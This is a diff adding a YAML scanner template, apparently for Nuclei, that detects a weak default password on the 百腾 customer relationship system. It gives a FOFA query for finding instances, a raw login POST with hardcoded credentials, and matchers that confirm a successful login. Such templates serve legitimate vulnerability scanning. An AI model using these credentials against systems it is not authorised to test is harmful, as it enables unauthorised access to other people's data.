@@ -1,0 +1,43 @@
+id: baiteng-default-login
+
+info:
+  name: 百腾客户关系系统弱口令
+  author: daffainfo
+  severity: high
+  description: |
+    百腾客户关系系统弱口令
+    fofa: body="百腾客户系统-登录"
+
+http:
+  - raw:
+      - |
+        POST /Login/UserLogin HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+
+        username=001045&password=0&referer=%24%7Bparam.referer%7D&mac=88%3A51%3AFB%3A47%3A08%3A75
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"status":200'
+        part: body
+      - type: word
+        words:
+          - '"url":'
+        part: body
+      - type: word
+        words:
+          - '"msg":'
+        part: body
